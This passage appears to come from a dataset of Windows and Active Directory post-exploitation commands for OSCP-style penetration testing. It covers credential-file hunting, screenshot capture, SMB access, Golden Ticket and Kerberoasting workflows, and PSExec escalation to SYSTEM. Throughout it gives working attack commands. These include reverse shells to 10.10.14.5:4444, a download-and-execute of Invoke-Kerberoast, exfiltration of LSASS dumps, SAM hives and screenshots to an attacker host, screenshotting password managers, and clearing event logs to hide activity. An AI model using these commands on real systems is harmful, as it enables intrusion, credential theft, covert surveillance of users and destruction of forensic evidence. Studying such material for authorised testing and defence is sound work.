C:\xampp\htdocs\config.php (XAMPP)
C:\wamp\www\config.inc.php (WAMP)

3. FTP server credentials:
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml
C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml (client)

4. VNC passwords:
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver (registry)
C:\Program Files\RealVNC\VNC Server\config.txt
C:\Program Files\UltraVNC\ultravnc.ini

5. Database connection strings:
C:\Program Files\<AppName>\app.config
C:\Windows\System32\inetsrv\config\applicationHost.config (IIS)

6. Windows deployment credentials:
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\system32\sysprep\Unattend.xml

7. Backup files:
C:\Backup\*.zip
C:\Users\<user>\Documents\backup*.rar
C:\Windows\System32\config\RegBack\SAM (registry backups)

8. SSH keys:
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\.ssh\id_rsa.pub

9. Git credentials:
C:\Users\<user>\.git-credentials
C:\<project>\.git\config

10. PowerShell history:
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type (Get-PSReadlineOption).HistorySavePath

SPECIFIC FILE SEARCHES:

Unattend.xml (auto-deployment credentials):
dir /s /b C:\*unattend.xml C:\*unattended.xml
type C:\Windows\Panther\Unattend.xml | findstr /i password

PowerShell history (command history):
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Often contains: net use commands with passwords, psexec with credentials, etc.

Web.config (database passwords):
type C:\inetpub\wwwroot\web.config
findstr /si password C:\inetpub\wwwroot\*.config

SAM backup (registry hives):
dir /s /b C:\Windows\repair\SAM C:\Windows\System32\config\RegBack\SAM
# If found, extract with impacket-secretsdump

FileZilla credentials:
type ""C:\Program Files\FileZilla Server\FileZilla Server.xml""
type ""%APPDATA%\FileZilla\recentservers.xml""

EXTRACTING CREDENTIALS FROM CONFIG FILES:

Web.config connection strings:
<connectionStrings>
  <add name=""DefaultConnection"" connectionString=""Server=localhost;Database=myDB;User Id=sa;Password=P@ssw0rd123;"" />
</connectionStrings>

Unattend.xml local admin password:
<UserAccounts>
  <LocalAccounts>
    <LocalAccount wcm:action=""add"">
      <Password>
        <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzACEA</Value>
        <PlainText>false</PlainText>
      </Password>
      <Name>Administrator</Name>
    </LocalAccount>
  </LocalAccounts>
</UserAccounts>
# Base64 decode: echo UABhAHMAcwB3AG8AcgBkADEAMgAzACEA | base64 -d

Final Recommendations:
1. Start with user profiles: C:\Users\*password*
2. Check web apps: C:\inetpub\wwwroot\*.config
3. PowerShell history: ConsoleHost_history.txt
4. Unattend.xml: C:\Windows\Panther\Unattend.xml
5. FileZilla: C:\Program Files\FileZilla Server\FileZilla Server.xml
6. Registry backups: C:\Windows\repair\SAM

TIME ESTIMATE:
User profiles search: 30 seconds - 2 minutes
Full C: drive search: 5-30 minutes (not recommended)
Targeted searches (specific directories): 10-60 seconds each","high"
"windows-screenshot-capture","Capture Screenshot (RDP/GUI Session)","post-exploit","powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\Temp\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""","Capture screenshot of current desktop session. Useful for documenting GUI-based findings, reading sensitive information displayed on screen, or proving access during engagements.","situational-awareness","USEFUL FOR DOCUMENTATION and discovering GUI-based secrets. OSCP USE CASES: (1) Capture proof.txt contents displayed on desktop, (2) Document application GUI settings revealing credentials, (3) Screenshot password manager vaults, (4) Capture Sticky Notes with passwords. REQUIREMENTS: Active desktop session (RDP, console, or VNC) - doesn't work over SSH/WinRM/PSExec without -i. File size: ~1-5MB for typical resolution. OPSEC: Delete screenshot after exfiltration to avoid leaving forensic artifacts. Time estimate: 2-5 seconds (capture + save).

MANUAL ALTERNATIVES:

Full PowerShell one-liner:
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\Temp\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""

Save to user temp (more stealthy):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('$env:TEMP\s.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""

JPEG format (smaller file size):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\screenshot.jpg', [System.Drawing.Imaging.ImageFormat]::Jpeg); $bitmap.Dispose(); $graphics.Dispose()""

NirCmd alternative (smaller executable):
nircmd.exe savescreenshot C:\screenshot.png
# Download nircmd.exe from NirSoft: https://www.nirsoft.net/utils/nircmd.html

Snipping Tool automation (Windows built-in):
%windir%\System32\SnippingTool.exe /clip
# Copies screenshot to clipboard - paste into Paint and save

PowerShell script file (for repeated captures):
# screenshot.ps1
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)

$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$filename = ""screenshot_$timestamp.png""
$bitmap.Save(""C:\Temp\$filename"", [System.Drawing.Imaging.ImageFormat]::Png)

$bitmap.Dispose()
$graphics.Dispose()

Write-Host ""Screenshot saved: C:\Temp\$filename""

Execute: powershell -ExecutionPolicy Bypass -File screenshot.ps1

Multiple monitor capture (all screens):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('C:\Temp\screenshot_all.png'); $bitmap.Dispose(); $graphics.Dispose()""

Continuous monitoring (take screenshot every 30 seconds):
while ($true) {
  $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
  # (screenshot capture code)
  Start-Sleep -Seconds 30
}

FILE TRANSFER AFTER CAPTURE:

SMB transfer:
copy C:\Temp\screenshot.png \\<LHOST>\share\

HTTP upload (PowerShell):
Invoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile C:\Temp\screenshot.png

Base64 encode and paste:
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\screenshot.png')) | Out-File C:\Temp\screenshot.txt
type C:\Temp\screenshot.txt
# Copy output, decode on Kali: base64 -d > screenshot.png

FTP upload:
echo open <LHOST> > ftp.txt
echo user anonymous anonymous >> ftp.txt
echo binary >> ftp.txt
echo put C:\Temp\screenshot.png >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

USE CASES:

1. Proof of access:
- Screenshot desktop showing machine name + proof.txt contents
- For OSCP: ipconfig /all + type proof.txt in same window

2. Password managers:
- Open KeePass, LastPass, 1Password GUI → screenshot
- Often reveals master password or stored credentials

3. Sticky Notes:
- Windows Sticky Notes often contain passwords
- Screenshot desktop if notes visible

4. Application credentials:
- Database management tools (SQL Server Mgmt Studio, MySQL Workbench)
- FTP clients (FileZilla, WinSCP) showing saved sessions
- Email clients with credential cache

5. Browser saved passwords:
- Open browser password manager → screenshot
- Chrome: chrome://settings/passwords
- Firefox: about:logins

6. Ongoing user activity:
- Monitor what user is currently doing
- Capture sensitive documents being edited
- Identify applications in use (exploit research targets)

CLEANUP:

Delete screenshot after exfiltration:
del C:\Temp\screenshot.png

Clear PowerShell history:
Remove-Item (Get-PSReadlineOption).HistorySavePath

TIME ESTIMATE:
Screenshot capture: 1-2 seconds
File save: <1 second
File transfer (SMB): 2-10 seconds (depends on size and connection)
Total: 3-13 seconds","medium"
"windows-net-use-smb-connect","Map Network Drive with net use","post-exploit","net use \\<TARGET>\<SHARE> /user:<DOMAIN>\<USERNAME> <PASSWORD>","Authenticate to remote SMB share and map network drive. Used to access remote file systems after credential discovery or for Golden Ticket validation.","lateral-movement","COMMON POST-EXPLOITATION task for file access and Golden Ticket validation. OSCP USE CASES: (1) Access remote C$ share after discovering credentials, (2) Validate Golden Ticket works: net use \\\\DC1\C$ (with ticket loaded), (3) Browse file shares for sensitive files, (4) Copy exploit tools to remote systems. OPSEC WARNING: Password in command line logged in Event ID 4688 and visible in process monitor. Use PowerShell SecureString for stealth. Credentials cached in LSASS after successful connection (extractable with Mimikatz). Time estimate: 2-5 seconds.

MANUAL ALTERNATIVES:

Basic connection:
net use \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd!

With drive letter mapping:
net use Z: \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd!
dir Z:\

Temporary connection (no persistence):
net use \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd! /persistent:no

Local account authentication:
net use \\\\<TARGET>\C$ /user:.\administrator P@ssw0rd!

List all network connections:
net use

Disconnect specific share:
net use \\\\<TARGET>\C$ /delete

Disconnect all shares:
net use * /delete /y

PowerShell (more secure - no password in command line):
$pass = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\administrator', $pass)
New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\C$ -Credential $cred

Pushd (temporary mapping, auto-unmounts when popd):
pushd \\\\<TARGET>\C$
dir
popd

Access without mapping (direct UNC):
dir \\\\<TARGET>\C$\Users
type \\\\<TARGET>\C$\Users\Administrator\Desktop\proof.txt

COMMON SMB SHARES:

Admin shares (require admin rights):
C$ - C: drive root
ADMIN$ - C:\Windows
IPC$ - Inter-process communication (null session testing)

Domain shares:
SYSVOL - Domain Group Policy and scripts (\\\\DC\SYSVOL\<domain>\)
NETLOGON - User logon scripts (\\\\DC\NETLOGON)

Custom shares:
net view \\\\<TARGET> (list available shares)
net share (on target - list local shares)

GOLDEN TICKET VALIDATION:

1. Create Golden Ticket with Mimikatz/ticketer.py
2. Load ticket: klist purge && klist add ticket.kirbi (Mimikatz) OR export KRB5CCNAME=ticket.ccache (Linux)
3. Test access: net use \\\\DC1.corp.com\C$
4. Should succeed WITHOUT /user and password flags (Kerberos auth)

FILE OPERATIONS AFTER CONNECTION:

List files:
dir \\\\<TARGET>\C$\Users\Administrator\Desktop\

Copy file from target:
copy \\\\<TARGET>\C$\Users\Administrator\Desktop\proof.txt C:\proof.txt

Copy file to target:
copy nc.exe \\\\<TARGET>\C$\Windows\Temp\

Execute remote binary (with psexec):
psexec \\\\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd /c ""C:\Windows\Temp\nc.exe -e cmd 10.10.14.5 4444""

Search remote files:
dir /s /b \\\\<TARGET>\C$\*password*

MOUNT VS DIRECT ACCESS:

Mount (with drive letter):
net use Z: \\\\<TARGET>\C$
dir Z:\Users
copy Z:\Users\admin\passwords.txt C:\

Direct UNC access (no drive letter):
dir \\\\<TARGET>\C$\Users
copy \\\\<TARGET>\C$\Users\admin\passwords.txt C:\

Direct access advantages:
- No drive letter required
- Less suspicious (no registry changes)
- Works in scripts without mount/unmount

Drive letter advantages:
- Some tools require drive letters (not UNC paths)
- Easier for repetitive access
- Tab completion in cmd.exe

CREDENTIAL CACHING:

After net use, credentials stored in:
1. LSASS process memory (extract with Mimikatz)
2. Windows Credential Manager: rundll32.exe keymgr.dll,KRShowKeyMgr
3. Registry: HKCU\Network (mapped drives)

Extract cached credentials:
mimikatz.exe ""sekurlsa::logonpasswords"" ""exit""
# Shows credentials used for net use connections

CLEANUP:

Disconnect share:
net use \\\\<TARGET>\C$ /delete

Clear stored credentials:
cmdkey /delete:<TARGET>
control userpasswords2 (GUI cleanup)

Clear PowerShell history:
Remove-Item (Get-PSReadlineOption).HistorySavePath

TIME ESTIMATE:
Connection: 2-5 seconds
File listing: 1-2 seconds
File transfer: Variable (depends on size)","medium"
"kerberos-klist-purge","Clear Kerberos Ticket Cache","post-exploit","klist purge","Delete all Kerberos tickets from current user's ticket cache. Used to clear old tickets before loading Golden/Silver tickets or to reset authentication state.","kerberos","ESSENTIAL STEP before Golden/Silver Ticket attacks. OSCP WORKFLOW: (1) Purge existing tickets: klist purge, (2) Load Golden Ticket: Mimikatz kerberos::ptt golden.kirbi OR Rubeus.exe ptt /ticket:golden.kirbi, (3) Verify: klist (should show new TGT), (4) Access resources: net use \\\\DC1\C$ (Kerberos auth, no password needed). WHY PURGE: Old TGTs may have expired or conflicting SIDs - purging ensures clean ticket cache. Time estimate: <1 second.

MANUAL ALTERNATIVES:

Purge all tickets (Windows):
klist purge

View current tickets before purge:
klist
# Shows: Client, Server, KerbTicket Encryption Type, Ticket Flags, Start/End Time

Mimikatz purge:
mimikatz.exe ""kerberos::purge"" ""exit""

Rubeus purge:
Rubeus.exe purge

Purge specific LUID (logon session):
Rubeus.exe purge /luid:0x3e7

GOLDEN TICKET WORKFLOW:

Complete Golden Ticket attack sequence:

1. DCSync to get krbtgt hash:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693d5e6f1532e6d0e2d5e4b1a9f5ebb:::

2. Get Domain SID:
lookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep ""Domain SID""
# Output: S-1-5-21-1987370270-658905905-1781884369

3. Create Golden Ticket (Kali):
ticketer.py -nthash 1693d5e6f1532e6d0e2d5e4b1a9f5ebb -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
# Creates: Administrator.ccache

4. Use ticket on Kali (Linux):
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.com/Administrator@DC1.corp.com

5. Use ticket on Windows:
# Transfer ticket to Windows target
# Convert ccache to kirbi if needed (Kerberos ticket converter)
mimikatz.exe ""kerberos::purge"" ""kerberos::ptt Administrator.kirbi"" ""exit""
klist # Verify ticket loaded
net use \\\\DC1\C$ # Test access

klist COMMAND USAGE:

List all tickets:
klist

List specific logon session:
klist -li 0x3e7

List ticket for specific target:
klist -li 0:0x3e4 <SPN>

Ticket cache location:
klist sessions # Shows all logon sessions

VERIFY GOLDEN TICKET:

After loading Golden Ticket:
klist
# Should show:
# Client: Administrator @ CORP.COM
# Server: krbtgt/CORP.COM @ CORP.COM
# KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
# Start Time / End Time / Renew Time

Test access:
net use \\\\DC1.corp.com\C$
# Should succeed WITHOUT username/password (Kerberos auth)

List remote directory:
dir \\\\DC1.corp.com\C$\Users

PsExec with ticket:
psexec.exe \\\\DC1.corp.com cmd
# Opens SYSTEM shell on DC (no password required)

TROUBLESHOOTING GOLDEN TICKETS:

Ticket not working:
1. Verify ticket loaded: klist (should show TGT)
2. Check ticket validity period: klist (Start/End Time)
3. Verify domain name matches: klist (should show correct domain)
4. Ensure clock sync: net time \\\\DC1 (< 5 min skew)
5. Test with specific service: net use \\\\DC1\ADMIN$

Clock skew error:
KRB_AP_ERR_SKEW - Time difference > 5 minutes
Solution:
- Sync time: net time \\\\DC1 /set /yes
- Or ntpdate: w32tm /resync /force

Wrong SID in ticket:
Access denied despite valid ticket
Solution:
- Verify Domain SID: lookupsid.py
- Recreate ticket with correct SID

Ticket expired:
klist shows past End Time
Solution:
- Create new ticket with longer validity
- ticketer.py -duration <days>

OPSEC:

klist leaves minimal logs:
- No specific Event ID for klist purge
- TGT requests logged (Event ID 4768) when new ticket used
- TGS requests logged (Event ID 4769) when accessing services

Golden Ticket detection:
- Look for TGT with unusual lifetime (e.g., 10 years)
- Monitor for TGT creation outside normal authentication
- Check for krbtgt password hash reuse

Mitigation:
- Rotate krbtgt password twice (invalidates all Golden Tickets)
- Monitor Event ID 4769 for anomalous service ticket requests
- Implement privileged account protections (PAM)

TIME ESTIMATE:
klist purge: <1 second
Golden Ticket creation: 5-10 seconds
Ticket injection: 2-5 seconds
Total workflow: 15-30 seconds","medium"
"windows-psexec-system-shell","Get SYSTEM Shell with PSExec","post-exploit","psexec.exe -accepteula -s -i cmd.exe","Elevate from Administrator to SYSTEM privileges using Sysinternals PSExec. Creates interactive command prompt running as NT AUTHORITY\SYSTEM - highest privilege level on Windows.","privilege-escalation","CRITICAL OSCP TECHNIQUE - elevate Administrator → SYSTEM for sensitive operations. WHEN TO USE: (1) Before dumping LSASS (procdump requires SYSTEM), (2) Before dumping SAM (reg save SAM requires SYSTEM or high-integrity admin), (3) Accessing protected files/registry, (4) Bypassing security restrictions. REQUIREMENTS: Must already be Administrator (check: whoami /groups). SYSTEM privileges enable: LSASS access, SAM access, all file system, all registry, debug privileges, impersonation. Time estimate: 2-5 seconds.

MANUAL ALTERNATIVES:

Basic SYSTEM shell:
psexec.exe -accepteula -s -i cmd.exe
whoami # Should show: nt authority\system

SYSTEM PowerShell (recommended for post-exploitation):
psexec.exe -accepteula -s -i powershell.exe

Run single command as SYSTEM:
psexec.exe -accepteula -s cmd /c ""whoami""

Mimikatz token elevation (alternative):
mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit""
# Elevates current process to SYSTEM

PowerShell Start-Process (requires GUI):
Start-Process cmd.exe -Verb RunAs
# UAC prompt appears - approve to get elevated shell

Service creation (manual SYSTEM escalation):
sc create EvilService binPath= ""cmd.exe /c net user hacker P@ss123 /add"" start= auto
sc start EvilService
# Service runs as SYSTEM by default

COMMON OSCP WORKFLOW:

1. Get Administrator shell:
psexec.py 'corp.com/admin:pass@192.168.50.75'

2. Upload PSExec:
copy \\10.10.14.5\share\psexec.exe C:\Windows\Temp\

3. Elevate to SYSTEM:
C:\Windows\Temp\psexec.exe -accepteula -s -i cmd.exe

4. Verify SYSTEM:
whoami
whoami /priv # Should show SeDebugPrivilege

5. Dump LSASS:
C:\Windows\Temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp

6. Dump SAM:
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

7. Exfiltrate to Kali:
copy lsass.dmp \\10.10.14.5\share\
copy sam.hive \\10.10.14.5\share\
copy system.hive \\10.10.14.5\share\

8. Process on Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
pypykatz lsa minidump lsass.dmp

VERIFY SYSTEM PRIVILEGES:

Check user:
whoami
# Output: nt authority\system

Check groups:
whoami /groups
# Should show:
# BUILTIN\Administrators
# NT AUTHORITY\SYSTEM
# MANDATORY LABEL\System Mandatory Level

Check privileges:
whoami /priv
# SYSTEM has ALL privileges:
# SeDebugPrivilege (debug programs - access LSASS)
# SeTakeOwnershipPrivilege (take ownership of any file)
# SeBackupPrivilege (backup files - bypass ACLs)
# SeRestorePrivilege (restore files)
# SeLoadDriverPrivilege (load kernel drivers)
# SeImpersonatePrivilege (impersonate tokens)

Test file access:
type C:\Windows\System32\config\SAM
# Should work (SAM readable only by SYSTEM)

Test LSASS access:
tasklist | findstr lsass
# Note PID
procdump.exe -accepteula -ma <PID> lsass.dmp
# Should succeed

SYSTEM VS ADMINISTRATOR:

Administrator:
- High privileges but not highest
- Cannot access LSASS memory directly (blocked by PPL on modern systems)
- Cannot read SAM database directly (even with admin rights)
- Subject to some UAC restrictions
- Can elevate to SYSTEM using PSExec/token manipulation

SYSTEM:
- Highest privilege level (higher than Administrator)
- Can access ALL processes including LSASS
- Can read ALL files including SAM database
- Bypasses UAC completely
- No password (service account)
- Cannot be used for network authentication (use $ machine account)

USE CASES FOR SYSTEM:

1. LSASS dumping:
psexec.exe -s -i cmd.exe
procdump.exe -ma lsass.exe lsass.dmp

2. SAM dumping:
psexec.exe -s -i cmd.exe
reg save HKLM\SAM sam.hive

3. Protected file access:
psexec.exe -s -i cmd.exe
type C:\Windows\System32\config\SAM

4. Service manipulation:
psexec.exe -s -i cmd.exe
sc config <service> binPath= ""C:\evil.exe""

5. Driver loading:
psexec.exe -s -i cmd.exe
sc create EvilDriver type= kernel binPath= C:\driver.sys
sc start EvilDriver

6. Token impersonation:
psexec.exe -s -i powershell.exe
# Load Invoke-TokenManipulation
Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -Username ""DOMAIN\Administrator""

OPSEC:

psexec.exe execution logged:
- Event ID 4688 (process creation)
- Event ID 7045 (service creation) - psexec creates PSEXESVC service
- Sysmon Event ID 1 (process creation)
- Sysmon Event ID 13 (registry modification) for service creation

AV considerations:
- PSExec is Microsoft-signed (usually allowed by AV)
- Some EDR flag PSExec for privilege escalation
- Alternative: Mimikatz token elevation (more stealthy, no service creation)

Cleanup:
- psexec.exe auto-deletes PSEXESVC service on exit
- Delete psexec.exe after use: del C:\Windows\Temp\psexec.exe
- Clear Event Logs (if SYSTEM): wevtutil cl System && wevtutil cl Security

ALTERNATIVE SYSTEM ELEVATION:

1. Mimikatz token elevation:
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # exit
# Current process now SYSTEM

2. Service creation:
sc create EvilSvc binPath= ""cmd /c C:\nc.exe 10.10.14.5 4444 -e cmd"" start= auto
sc start EvilSvc
# Service runs as SYSTEM, connects back

3. Scheduled task as SYSTEM:
schtasks /create /tn EvilTask /tr ""cmd /c C:\evil.exe"" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn EvilTask

4. AT command (older Windows):
at 13:37 C:\evil.exe
# Task runs as SYSTEM at specified time

TIME ESTIMATE:
PSExec elevation: 2-5 seconds
Total workflow (upload → elevate → dump): 30-90 seconds","high"
"powerview-enumerate-spns","PowerView - Enumerate Service Principal Names","enumeration","Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname","Enumerate Active Directory user accounts with Service Principal Names (SPNs) using PowerView. Identifies Kerberoastable accounts - service accounts whose TGS tickets can be requested and cracked offline.","active-directory","CRITICAL FOR KERBEROASTING ATTACKS. PowerView SPN enumeration identifies service accounts whose passwords can be cracked offline. OSCP WORKFLOW: (1) Enumerate SPNs: Get-NetUser -SPN, (2) Request TGS tickets: Invoke-Kerberoast or GetUserSPNs.py, (3) Crack offline: hashcat -m 13100 (TGS-REP). COMMON FINDS: SQL Server service accounts (often weak passwords), IIS application pools, custom Windows services. Service accounts typically have: weak passwords (for ease of memory), high privileges (often Domain Admin or equivalent), rarely rotated passwords (change breaks applications). Time estimate: 2-10 seconds.

MANUAL ALTERNATIVES:

PowerView SPN enumeration:
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

PowerView detailed output:
Get-NetUser -SPN
# Shows: distinguishedname, samaccountname, serviceprincipalname, pwdlastset, memberof, etc.

ActiveDirectory module (if installed):
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName

Native Windows setspn:
setspn -T corp.com -Q */*
# Output: CN=SQL Service,CN=Users,DC=corp,DC=com - MSSQLSvc/sql01.corp.com:1433

Impacket from Kali:
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70
# Lists SPNs + can request TGS hashes directly

PowerView with specific service type:
Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -like '*SQL*'}
# Filter for SQL Server accounts only

FULL KERBEROASTING WORKFLOW:

1. Enumerate SPNs (PowerView):
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

Output:
samaccountname serviceprincipalname
-------------- --------------------
sqlservice     MSSQLSvc/sql01.corp.com:1433
iis_svc        HTTP/web01.corp.com

2. Request TGS tickets (Invoke-Kerberoast):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl

OR Rubeus:
Rubeus.exe kerberoast /outfile:hashes.txt

OR Impacket (from Kali):
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70 -request -outputfile hashes.txt

3. Crack with Hashcat:
hashcat -m 13100 hashes.txt rockyou.txt --force
# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)

4. Use cracked password:
crackmapexec smb 192.168.50.0/24 -u sqlservice -p CrackedPassword123!
# Often service accounts have admin rights on multiple servers

COMMON SPN PATTERNS:

SQL Server:
MSSQLSvc/<hostname>:<port>
MSSQLSvc/sql01.corp.com:1433

HTTP/IIS:
HTTP/<hostname>
HTTP/web01.corp.com

Exchange:
exchangeMDB/<hostname>
exchangeRFR/<hostname>
ExchangeAB/<hostname>

WSUS:
HTTP/<hostname>:8530

Custom services:
SERVICE/<hostname>
APP/<hostname>

SPN ENUMERATION VARIATIONS:

Find all SPNs for specific user:
Get-NetUser -Identity sqlservice | Select-Object serviceprincipalname

Find weak SPNs (RC4-HMAC):
Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -and $_.msds-supportedencryptiontypes -eq 0}
# RC4-HMAC is weaker than AES - easier to crack

Find recently set SPNs:
Get-NetUser -SPN | Where-Object {$_.pwdlastset -gt (Get-Date).AddDays(-30)}

Find SPNs with admin privileges:
Get-NetUser -SPN | Where-Object {$_.memberof -like '*Admin*'}

ALTERNATIVE TOOLS:

Rubeus (Windows):
Rubeus.exe kerberoast /stats
# Shows: Total Kerberoastable users, encryption types

Impacket GetUserSPNs (Kali):
GetUserSPNs.py corp.com/user:pass -dc-ip 192.168.50.70
# No TGS request, just enumeration

LDAP query (manual):
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))
# Use with ldapsearch or AD Explorer

BloodHound:
Invoke-BloodHound -CollectionMethod All
# BloodHound GUI → Analysis → List all Kerberoastable Accounts

WHY KERBEROASTING WORKS:

1. Any domain user can request TGS for any SPN
2. TGS is encrypted with service account's NTLM hash
3. TGS can be cracked offline (no network traffic)
4. Service accounts often have weak passwords
5. No detection (legitimate Kerberos traffic)

DETECTION:
- Monitor Event ID 4769 (TGS requested) for unusual patterns
- Look for multiple TGS requests for same SPN from single user
- Detect RC4 encryption (modern systems should use AES)
- Monitor for accounts requesting TGS but not using service

MITIGATION:
- Strong service account passwords (25+ chars)
- Managed Service Accounts (MSA) / Group MSAs
- Disable RC4 encryption (force AES)
- Regular password rotation for service accounts
- Monitor Kerberos Event ID 4769

OSCP EXAM TIPS:
1. Always enumerate SPNs on domain targets
2. Service accounts often reused across multiple systems
3. Cracked service account = lateral movement opportunity
4. Check service account group memberships (often admin)

TIME ESTIMATE:
SPN enumeration: 2-10 seconds
Kerberoast attack (full workflow): 1-5 minutes
Password cracking: Variable (depends on password strength)","high"
"ad-dcsync-check-privileges","Check DCSync Privileges (Replication Rights)","enumeration","Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl","Check which users/groups have DCSync privileges (DS-Replication-Get-Changes rights). Identifies accounts that can perform DCSync attacks to extract domain credentials.","active-directory","ENUMERATE DCSYNC PRIVILEGES before attempting DCSync. Identifies which accounts can perform replication attacks. OSCP USE CASE: After compromising a user, check if they have DCSync rights (privilege escalation path). DEFAULT ACCOUNTS WITH DCSYNC: Domain Admins, Enterprise Admins, Administrators, Domain Controllers. CUSTOM GRANTS: Misconfigurations may grant DCSync to lower-privileged accounts (Exchange Servers, backup services, etc.). WHY IMPORTANT: DCSync requires specific rights - not all admins can DCSync. Time estimate: 5-15 seconds.

MANUAL ALTERNATIVES:

PowerView DCSync privilege check:
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication-Get-Changes' -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType | fl

Convert SID to username:
$sid = 'S-1-5-21-1987370270-658905905-1781884369-1104'
ConvertFrom-SID $sid
# Or: (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value

ActiveDirectory module alternative:
(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'} | Select-Object IdentityReference,ActiveDirectoryRights
# GUID 1131f6aa... = DS-Replication-Get-Changes

BloodHound query:
# In BloodHound GUI:
# Analysis → Shortest Paths to Domain Admins from Owned Principals
# Look for ""DCSync"" edge type
# OR Cypher query:
MATCH (n) WHERE n.hasdcsync=true RETURN n

ADFind (Windows tool):
